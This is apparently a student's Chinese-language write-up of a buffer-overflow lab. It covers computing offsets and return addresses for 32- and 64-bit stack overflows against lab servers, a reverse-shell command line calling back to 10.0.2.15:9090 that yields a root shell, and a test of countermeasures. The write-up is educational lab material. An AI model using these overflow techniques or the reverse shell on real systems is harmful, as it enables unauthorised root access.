#### 前置准备

关闭地址随机化：`sudo /sbin/sysctl -w kernel.randomize_va_space=0`

### Task 1 Getting Familiar with Shellcode

利用strcpy不检查边界的漏洞，可以通过编写shellcode来实现我们想要实现在宿主机上的功能。

检查shellcode32.py和shellcode64.py，我们可以通过更改代码来实现删除tempfile

![[Pasted image 20231018193457.png]]

可以发现tempfile已经被删除

![[Pasted image 20231018193525.png]]

### Task 2 Level-1 Attack

为了完成本任务，首先进行前置准备。
 - 关闭地址随机化

![[Pasted image 20231018194229.png]]

- 进入server-code文件夹，编译

![[Pasted image 20231018194348.png]]

- 启动docker

![[Pasted image 20231018194435.png]]

- 进入attack-code文件夹，修改exploit.py，将shellcode32.py中的shellcode复制进来。

![[Pasted image 20231018195119.png]]

- 我们修改exploit.py
	- start: 由于总长度为517字节，我们将start改为517-shellcode的长度。
	- ret: ret为返回地址高地址方向的下一个位置，即ebp+8
	- 计算偏移值，为offset = 0xFFFFD358 - 0xFFFFD2E8 + 4。这里的4是因为我们采用32位。

![[Pasted image 20231018200716.png]]

最后我们看到服务器成功返回了我们在shellcode中隐藏的相关命令的返回值。
### Task 3 Level-2 Attack
Manual提示，在这个任务中，ebp的地址没有返回。实际连接上level2的服务器后，的确没有返回ebp的地址。采用方案为在str中填充大量的entry address，提高命中率。

![[Pasted image 20231018203151.png]]

既然没有提供ebp的位置，那我们可以直接遍历求得。
- 修改exploit.py
	- start： 已知 buffer 大小范围为 [100, 300] ，故选择从 buffer 起始位置向高地址方向偏移300 的地址作为攻击代码的起始地址（shellcode 长度为 137，而 300 + 137 < 517，可以保证存下所有shellcode）
	- ret ：受到 start 的约束，ret 为 buffer 地址向高地址方向偏移 start ，即`0xffffd708`+start
	- 由于buffer大小为100到300之间，所以offset 为 100-300 之间的某个值

![[Pasted image 20231018205652.png]]

可以看到执行溢出成功。

### Task 4 Level-3 Attack

- 与32位机器上的缓冲区溢出攻击相比，64位机器上的攻击更加困难。其中最困难的部分是地址。虽然x64架构支持64位地址空间，但机器只允许使用从0x00到0x00007FFFFFFFFFFF的地址。这意味着对于每个地址（8个字节），最高的两个字节始终为零。

- 在我们的缓冲区溢出攻击中，我们需要在负载中存储至少一个地址，并通过strcpy()将负载复制到堆栈中。由于strcpy()函数在遇到零时会停止复制，如果零出现在负载的中间，零之后的内容就无法被复制到堆栈中。

- 由于X86是小端模式，因此将 ret 以小端形式转为二进制码时，\x00 实际上在后边（对应着地址的低位），所以应当将 shellcode 放在返回地址的前面（向地址低位的方向），这样才保证 shellcode 被写到栈上；而原来在栈上的返回地址高位同样为 0，因此和 ret 的低位拼接起来以后仍然得到正确的 ret

- 首先查看rbp和栈的位置

![[Pasted image 20231018212016.png]]

- 修改exploit.py
	- shellcode部分修改为64位版本.
	- start：shellcode 应在返回地址之前（向高地址方向），而shellcode 长度为 164，因此只能设为 0（因为 buffer 到返回地址的间距正好是 164，如果 start 大于 0，则 ret 会覆盖掉 shellcode）.
	- 因为 start 为 0，因此 entry point 就是 buffer 的地址，因此是0x00007fffffffe1c0
	- offset = 0x00007fffffffe290 - 0x00007fffffffe1c0+8 = 216

![[Pasted image 20231018214227.png]]

可以看到，经过操作，成功触发我们插入的命令。

![[Pasted image 20231018214339.png]]

### Task 5 Level-4 Attack

- 这个Task的难点为buffer较小，无法将shellcode放在返回地址之前。同时，如果把shellcode放在返回地址之后，又会因为64位地址高位为0而导致strcpy（）提前结束，所以这里我们依靠buffer进行攻击。
	- 这里ret的值需要在rbp+1184到rbp+1424之间，我们取1200
	- offset为rbp-栈地址+8

修改exploit.py后生成badfile，作为payload传输给10.9.0.8后成功触发预定义操作。

![[Pasted image 20231019103128.png]]

### Task 6 Level-5 Attack

首先ifconfig查看本机IP，我的实验环境为10.0.2.15。因此我们对命令栏进行修改，同时注意最后的星号位置不能发生变化。

对于这一行指令，解释如下：

- `/bin/bash -i`: 启动一个交互式的 Bash shell。

- `> /dev/tcp/10.0.2.15/9090`: 将标准输出重定向到 IP 地址为 10.0.2.15、端口号为 9090 的网络套接字（通过使用特殊的 `/dev/tcp` 设备文件来实现）。

- `0<&1`: 将标准输入重定向到标准输出，这样输入的数据将通过网络套接字发送出去。

- `2>&1`: 将标准错误输出重定向到标准输出，这样错误信息也会通过网络套接字发送出去。

- 最后的 * 是一个位置标记，用于指示命令字符串的结束。

这个命令的目的是在目标机器上建立一个反向 shell 连接。当目标机器执行这个命令时，它会尝试连接到 IP 地址为 10.0.2.15、端口号为 9090 的远程服务器。如果连接成功，目标机器的 Bash shell 将与远程服务器建立一个交互式连接，从而使攻击者能够通过该连接执行命令并获得远程访问权限。

![[Pasted image 20231019141712.png]]

监听到反弹shell，攻击成功。查看uid=0，说明我们拿到了root shell

![[Pasted image 20231019141808.png]]

### Task 7 Experimenting with Other Countermeasures

#### 7.a 启用stack protector

![[Pasted image 20231019152311.png]]
#### 7.b 关闭可执行栈

![[Pasted image 20231019154626.png]]

可以看到，均无法实现预期的攻击目标。